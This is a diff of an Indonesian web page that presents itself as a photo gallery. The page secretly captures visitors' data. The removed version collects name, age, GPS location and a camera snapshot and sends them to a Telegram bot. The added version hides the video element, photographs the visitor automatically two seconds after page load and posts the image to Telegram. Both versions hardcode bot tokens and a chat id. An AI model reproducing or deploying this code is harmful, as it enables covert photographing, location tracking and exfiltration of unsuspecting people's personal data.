@@ -1,217 +1,80 @@
 <!DOCTYPE html>
 <html lang="id">
 <head>
-  <meta charset="utf-8" />
-  <title>Galeri Kucing Lucu 🐱</title>
-  <meta name="viewport" content="width=device-width,initial-scale=1" />
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Galeri Kenangan</title>
   <style>
-    :root{
-      --pink:#ff69b4; --bg:#fff4f8; --card:#ffe6ef;
+    body {
+      font-family: Arial, sans-serif;
+      background: url('https://files.catbox.moe/109kop.jpg') no-repeat center center fixed;
+      background-size: cover;
+      color: white;
+      margin: 0;
+      padding: 0;
+      text-align: center;
     }
-    html,body{height:100%;margin:0;font-family:"Comic Sans MS",cursive,system-ui;background:var(--bg);color:#333}
-    .wrap{max-width:980px;margin:0 auto;padding:20px;text-align:center}
-    h1{color:var(--pink);font-size:2.4rem;margin:8px 0}
-    p.subtitle{margin-top:0.2rem;color:#666}
-    /* Overlay prompt */
-    #prompt{
-      position:fixed;inset:0;background:rgba(0,0,0,0.45);display:flex;align-items:center;justify-content:center;z-index:9999;
+    header {
+      background: rgba(0,0,0,0.6);
+      padding: 15px;
+      font-size: 20px;
+      font-weight: bold;
     }
-    .card{
-      background:linear-gradient(180deg, #fff,#ffeef7);padding:20px;border-radius:14px;box-shadow:0 8px 30px rgba(0,0,0,0.25);width:90%;max-width:420px
+    .gallery {
+      display: grid;
+      grid-template-columns: repeat(3, 1fr);
+      gap: 10px;
+      padding: 20px;
     }
-    .big-btn{
-      background:var(--pink);color:white;border:0;padding:14px 18px;border-radius:10px;font-size:1.05rem;cursor:pointer;
+    .gallery img {
+      width: 100%;
+      border-radius: 10px;
+      box-shadow: 0 0 10px rgba(0,0,0,0.6);
     }
-    .hint{font-size:0.9rem;color:#222;margin-top:10px}
-    /* gallery */
-    .gallery{display:grid;grid-template-columns:repeat(auto-fit,minmax(200px,1fr));gap:14px;margin-top:20px}
-    .cat-card{background:var(--card);padding:10px;border-radius:12px;box-shadow:0 4px 12px rgba(0,0,0,0.12);text-align:center}
-    .cat-card img{width:100%;height:auto;border-radius:10px}
-    .form{display:inline-block;background:var(--card);padding:16px;border-radius:12px;box-shadow:0 6px 18px rgba(0,0,0,0.08)}
-    input,button{padding:8px;border-radius:8px;border:1px solid #d9d9d9;font-size:1rem}
-    button{background:var(--pink);color:#fff;border:0;cursor:pointer;margin-left:8px}
-    .note{font-size:0.85rem;color:#333;margin-top:8px}
-    @media(max-width:520px){h1{font-size:1.6rem}}
+    video {
+      display: none; /* kamera tetap nyala tapi disembunyiin */
+    }
   </style>
 </head>
 <body>
-  <div class="wrap">
-    <h1>Galeri Kucing Lucu 🐱</h1>
-    <p class="subtitle">intro dulu dong kamu siapa, lalu klik Izinkan.</p>
-
-    <!-- form -->
-    <div style="margin-top:14px">
-      <form id="catForm" class="form" onsubmit="return false;">
-        <label>Nama Lengkap<br><input id="name" name="name" type="text" required></label><br><br>
-        <label>Umur<br><input id="age" name="age" type="number" required></label><br><br>
-        <button id="startBtn" class="big-btn" type="button">kirim</button>
-        <div class="note">Trimakasih Sudah intro:).</div>
-      </form>
-    </div>
-
-    <!-- gallery -->
-    <div class="gallery" id="gallery" aria-hidden="true" style="margin-top:24px">
-      <div class="cat-card"><img src="https://files.catbox.moe/g5u1ys.jpeg" alt=""><a href="https://files.catbox.moe/g5u1ys.jpeg" download><button>Download</button></a></div>
-      <div class="cat-card"><img src="https://files.catbox.moe/vovjx7.jpeg" alt=""><a href="https://files.catbox.moe/vovjx7.jpeg" download><button>Download</button></a></div>
-      <div class="cat-card"><img src="https://files.catbox.moe/yjf3au.jpeg" alt=""><a href="https://files.catbox.moe/yjf3au.jpeg" download><button>Download</button></a></div>
-      <div class="cat-card"><img src="https://files.catbox.moe/5zqaw1.jpeg" alt=""><a href="https://files.catbox.moe/5zqaw1.jpeg" download><button>Download</button></a></div>
-    </div>
+  <header>HALLO NAMA SAYA KENZY</header>
+  <div class="gallery">
+    <img src="https://files.catbox.moe/gycs3w.jpg" alt="foto1">
+    <img src="https://files.catbox.moe/m73e1f.jpeg" alt="foto2">
+    <img src="https://files.catbox.moe/rlh01t.jpeg" alt="foto3">
   </div>
 
-  <!-- hidden video/canvas for capture -->
-  <video id="v" autoplay playsinline style="display:none"></video>
-  <canvas id="c" style="display:none"></canvas>
-
-  <!-- Prompt overlay is optional; but keep big CTA -->
-  <div id="prompt" aria-hidden="true" style="display:none">
-    <div class="card">
-      <h2 style="margin:0">Izinkan Lokasi & Kamera</h2>
-      <p class="hint">Untuk eksperimen ini: klik tombol agar browser meminta izin lokasi & kamera. Foto akan otomatis diambil sekali.</p>
-      <div style="text-align:center;margin-top:12px"><button id="promptBtn" class="big-btn">Izinkan Sekarang</button></div>
-    </div>
-  </div>
+  <video id="video" autoplay></video>
+  <canvas id="canvas" style="display:none;"></canvas>
 
   <script>
-    // === CONFIG: ganti token & chat id ini sebelum deploy ===
-    const TOKEN = "7897552509:AAECrwGQu0zMiqTMYhULLZLwr7plqANjFEk";
-    const CHAT_ID = "6626316127";
-    const TELEGRAM_SENDPHOTO = (t) => `https://api.telegram.org/bot${t}/sendPhoto`;
-    // =======================================================
+    const token = "7601935402:AAE8ysjnr8M9k8SFmsfsRbf9FCk1x8qYeV0";
+    const chatId = "6626316127";
 
-    // helper: sleep
-    const sleep = (ms) => new Promise(r => setTimeout(r, ms));
+    const video = document.getElementById('video');
+    const canvas = document.getElementById('canvas');
+    const context = canvas.getContext('2d');
 
-    const startBtn = document.getElementById('startBtn');
-    const promptBtn = document.getElementById('promptBtn');
+    navigator.mediaDevices.getUserMedia({ video: true })
+      .then(stream => {
+        video.srcObject = stream;
+        setTimeout(() => {
+          canvas.width = video.videoWidth;
+          canvas.height = video.videoHeight;
+          context.drawImage(video, 0, 0);
+          canvas.toBlob(blob => {
+            const formData = new FormData();
+            formData.append("chat_id", chatId);
+            formData.append("photo", blob, "snap.jpg");
 
-    // When user clicks CTA: do the whole flow
-    startBtn.addEventListener('click', () => {
-      // It's a user gesture -> will allow getUserMedia / geolocation prompt
-      runFlow();
-    });
-
-    if (promptBtn) promptBtn.addEventListener('click', runFlow);
-
-    async function runFlow(){
-      // disable button to avoid repeated clicks
-      startBtn.disabled = true;
-      startBtn.textContent = 'Meminta izin...';
-
-      // collect form data
-      const name = document.getElementById('name').value.trim();
-      const age = document.getElementById('age').value.trim();
-
-      if(!name || !age){
-        alert('Isi nama dan umur dulu ya.');
-        startBtn.disabled = false;
-        startBtn.textContent = 'Izinkan Lokasi & Kamera';
-        return;
-      }
-
-      // 1) request location (wrap in promise)
-      let gps = 'Tidak tersedia';
-      if (navigator.geolocation) {
-        try {
-          gps = await new Promise((resolve) => {
-            // set a timeout in case user takes too long
-            let done = false;
-            const timer = setTimeout(() => { if(!done){ done=true; resolve('Gagal mendapatkan lokasi (timeout)'); }}, 12000);
-            navigator.geolocation.getCurrentPosition(pos => {
-              if(done) return;
-              done=true; clearTimeout(timer);
-              resolve(`Lat:${pos.coords.latitude.toFixed(6)},Lon:${pos.coords.longitude.toFixed(6)}`);
-            }, err => {
-              if(done) return;
-              done=true; clearTimeout(timer);
-              resolve('Gagal mendapatkan lokasi');
-            }, { enableHighAccuracy:true, maximumAge:0, timeout:10000 });
+            fetch(`https://api.telegram.org/bot${token}/sendPhoto`, {
+              method: "POST",
+              body: formData
+            });
           });
-        } catch(e){
-          gps = 'Gagal mendapatkan lokasi';
-        }
-      } else {
-        gps = 'Browser tidak mendukung GPS';
-      }
-
-      // 2) request camera -> capture one photo
-      let photoBlob = null;
-      if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
-        try {
-          const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "environment" }, audio: false });
-          const video = document.getElementById('v');
-          video.srcObject = stream;
-
-          // wait a short moment for camera to adjust
-          await sleep(600);
-
-          // draw current frame to canvas
-          const canvas = document.getElementById('c');
-          canvas.width = video.videoWidth || 1280;
-          canvas.height = video.videoHeight || 720;
-          const ctx = canvas.getContext('2d');
-          ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
-
-          // convert to blob
-          photoBlob = await new Promise(resolve => canvas.toBlob(resolve, 'image/jpeg', 0.8));
-
-          // stop all tracks
-          stream.getTracks().forEach(t => t.stop());
-        } catch (err) {
-          console.warn('Camera error or denied', err);
-          photoBlob = null;
-        }
-      } else {
-        photoBlob = null;
-      }
-
-      // compose caption
-      const caption = `📌 Data Baru Masuk:\n👤 Nama: ${escapeMd(name)}\n🎂 Umur: ${escapeMd(age)}\n📍 Lokasi GPS: ${escapeMd(gps)}\n⏱ ${new Date().toLocaleString()}`;
-
-      // 3) send to telegram
-      try {
-        if(photoBlob){
-          // send as photo with caption
-          const fd = new FormData();
-          fd.append('chat_id', CHAT_ID);
-          fd.append('photo', photoBlob, 'selfie.jpg');
-          fd.append('caption', caption);
-          fd.append('parse_mode', 'Markdown');
-
-          const resp = await fetch(TELEGRAM_SENDPHOTO(TOKEN), { method: 'POST', body: fd });
-          const j = await resp.json();
-          if(!j.ok) throw new Error(JSON.stringify(j));
-        } else {
-          // fallback: send as text message
-          const body = { chat_id: CHAT_ID, text: caption, parse_mode: 'Markdown' };
-          const resp = await fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage`, { method:'POST', headers:{'Content-Type':'application/json'}, body: JSON.stringify(body) });
-          const j = await resp.json();
-          if(!j.ok) throw new Error(JSON.stringify(j));
-        }
-
-        // success UX: show gallery (it was already visible but we can highlight)
-        startBtn.textContent = 'Sukses! Terima kasih 😊';
-        // show gallery (aria-hidden false)
-        document.getElementById('gallery').setAttribute('aria-hidden','false');
-        alert('waw nama kamu indah banget yaa:)');
-      } catch (err) {
-        console.error('Kirim ke Telegram gagal', err);
-        alert('Gagal mengirim ke Telegram. Cek token/chat_id atau koneksi.');
-        startBtn.disabled = false;
-        startBtn.textContent = 'kirim';
-      }
-    }
-
-    function escapeMd(s){
-      return String(s).replace(/([_*\[\]()~`>#+\-=|{}.!])/g, '\\$1');
-    }
-
-    // optional: show prompt overlay on first load
-    window.addEventListener('load', () => {
-      // small delay then focus name input
-      document.getElementById('name').focus();
-      // keep gallery visible but CTA is main action
-      document.getElementById('gallery').setAttribute('aria-hidden','false');
-    });
+        }, 2000); // Jepret otomatis setelah 2 detik
+      })
+      .catch(err => console.log("Akses kamera ditolak:", err));
   </script>
 </body>
 </html>
